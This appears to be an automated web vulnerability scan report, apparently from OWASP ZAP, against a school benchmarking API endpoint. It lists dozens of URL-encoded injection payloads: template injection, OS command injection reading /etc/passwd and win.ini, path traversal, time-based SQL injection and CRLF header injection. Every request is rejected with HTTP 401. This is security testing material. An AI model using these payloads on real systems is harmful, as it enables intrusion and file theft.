* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%253C%2521--%2523EXEC+cmd%253D%2522ls+%252F%2522--%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%253C%2523assign+ex%253D%2522freemarker.template.utility.Execute%2522%253Fnew%2528%2529%253E+%2524%257B+ex%2528%2522sleep+15%2522%2529+%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%253C%2525%253D%2525x%2528sleep+15%2529%2525%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%253C%2525%253D+global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%2525%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%255Cuser-data
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%255CWEB-INF%255Cweb.xml
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%255D%255D%253E
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%257B%257B%2522%2522.__class__.__mro__%255B1%255D.__subclasses__%2528%2529%255B157%255D.__repr__.__globals__.get%2528%2522__builtins__%2522%2529.get%2528%2522__import__%2522%2529%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%2529%257D%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%257B%257B%253D+global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529+%257D%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%257B%257B__import__%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%252C+shell%253DTrue%2529%257D%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%257B%257Brange.constructor%2528%2522return+eval%2528%255C%2522global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%255C%2522%2529%2522%2529%2528%2529%257D%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=%257Bsystem%2528%2522sleep+15%2522%2529%257D
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252FWindows%252Fsystem.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255CWindows%255Csystem.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=0W45pz4p
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=1498374535918995670.owasp.org
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=5%253BURL%253D%2527https%253A%252F%252F1498374535918995670.owasp.org%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=any%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=any%250D%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=any%250D%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e%250D%250A
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=any%253F%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=any%253F%250D%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=any%253F%250D%250ASet-cookie%253A+Tamper%253D5fb47584-96d1-4b27-9221-8cf7a95dc34e%250D%250A
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=c%253A%252F
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=c%253A%252FWindows%252Fsystem.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=c%253A%255C
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=c%253A%255CWindows%255Csystem.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=case+randomblob%2528100000%2529+when+not+null+then+1+else+1+end+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=case+randomblob%25281000000%2529+when+not+null+then+1+else+1+end+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=case+randomblob%252810000000%2529+when+not+null+then+1+else+1+end+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=case+randomblob%2528100000000%2529+when+not+null+then+1+else+1+end+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=case+randomblob%25281000000000%2529+when+not+null+then+1+else+1+end+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=cat+%252Fetc%252Fpasswd
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=get-help
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=http%253A%252F%252F%255C1498374535918995670.owasp.org
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=http%253A%252F%252F1498374535918995670.owasp.org
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=http%253A%252F%252Fwww.google.com
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=http%253A%252F%252Fwww.google.com%252F
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=http%253A%252F%252Fwww.google.com%252Fsearch%253Fq%253DZAP
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=http%253A%252F%252Fwww.google.com%253A80%252F
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=http%253A%252F%252Fwww.google.com%253A80%252Fsearch%253Fq%253DZAP
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=https%253A%252F%252F%255C1498374535918995670.owasp.org
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=https%253A%252F%252F1498374535918995670%25252eowasp%25252eorg
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=https%253A%252F%252F1498374535918995670.owasp.org
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2522%2526cat+%252Fetc%252Fpasswd%2526%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2522%2526sleep+15.0%2526%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2522%2526timeout+%252FT+15.0%2526%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2522%2526type+%2525SYSTEMROOT%2525%255Cwin.ini%2526%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2522%253Bcat+%252Fetc%252Fpasswd%253B%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2522%253Bget-help
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2522%253Bsleep+15.0%253B%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2522%253Bstart-sleep+-s+15.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2522%257Ctimeout+%252FT+15.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2522%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2522+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+%252F+%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2522+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+%252F+%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2522+%252F+sleep%252815%2529+%252F+%2522
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2522+and+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2522+UNION+ALL+select+NULL+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2522+where+0+in+%2528select+sleep%252815%2529+%2529+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2526cat+%252Fetc%252Fpasswd%2526
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2526sleep+15.0%2526
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2526timeout+%252FT+15.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2526type+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2527%2526cat+%252Fetc%252Fpasswd%2526%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2527%2526sleep+15.0%2526%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2527%2526timeout+%252FT+15.0%2526%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2527%2526type+%2525SYSTEMROOT%2525%255Cwin.ini%2526%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2527%2528
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2527%2529+UNION+ALL+select+NULL+--+
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2527%253Bcat+%252Fetc%252Fpasswd%253B%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2527%253Bget-help
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2527%253Bsleep+15.0%253B%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2527%253Bstart-sleep+-s+15.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2527%257Ctimeout+%252FT+15.0
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2527%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/user-data%3FuserId=userId&type=comparator-set&organisationType=school&organisationId=organisationId&status=pending&id=id%2527+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+%252F+%2527
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
